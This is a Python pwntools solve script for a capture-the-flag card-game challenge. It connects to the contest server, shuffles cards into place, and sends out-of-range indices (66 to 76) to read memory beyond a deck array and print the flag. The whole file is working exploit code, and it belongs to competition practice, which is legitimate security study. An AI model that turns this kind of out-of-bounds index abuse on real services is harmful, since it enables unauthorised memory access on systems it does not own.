from pwn import *
import ctypes

context.log_level = 'debug'

# offsets:
# 7 p 66
# 6 1 deck[]
# 5 h 71
# 4 S 76
# 3 d 69
# 2 n 75
# 1 1 deck[]
# 0 F 72

r = remote("chal.24.cuhkctf.org",  24066)
# r = process("./chall")

def get_deck():
    r.recvuntil(b"Cards at hand:\n")
    cur_cards = r.recvuntil(b"\t\n")
    try:
        cards = cur_cards.decode().strip('\n\t')
        cards = cards[3:].split('\t')
        return [card.strip(' \t\n') for card in cards]
    except:
        return ["invalid"]*8

deck = get_deck()
if deck[1] != '2':
    while '2' not in deck:
        for i in range(8, 13):
            r.sendlineafter(b"Pick a card to get: \n", f"{i}".encode())
            deck = get_deck()
            if deck[0] == '2': break
            else:
                r.sendlineafter(b"Pick a card to get: \n", f"{i}".encode())
    r.sendlineafter(b"Pick a card to get: \n", f"{deck.index('2')}".encode())
    r.sendlineafter(b"Pick a card to get: \n", b"1")

if deck[6] != '1':
    while '1' not in deck:
        for i in range(8, 13):
            r.sendlineafter(b"Pick a card to get: \n", f"{i}".encode())
            deck = get_deck()
            if deck[0] == '1': break
            else:
                r.sendlineafter(b"Pick a card to get: \n", f"{i}".encode())
    r.sendlineafter(b"Pick a card to get: \n", f"{deck.index('1')}".encode())
    r.sendlineafter(b"Pick a card to get: \n", b"6")

deck = get_deck()

offsets = [b'75', b'69', b'76', b'71', b'66']
card_pos = [b'2', b'3', b'4', b'5', b'7']
# card_pos = [b'7', b'5', b'4', b'3', b'2']
for i in range(5):
    r.recvuntil(b"Pick a card to get: \n")
    r.sendline(offsets[i])
    r.recvuntil(b"Pick a card to get: \n")
    r.sendline(card_pos[i])

r.sendlineafter(b"Pick a card to get: \n", b"72")
deck = get_deck()
print(f"deck: {deck}")
r.sendlineafter(b"Pick a card to get: \n", b"bet")
flag = r.recvuntil('}')
print(f"flag: {flag}")
r.interactive()
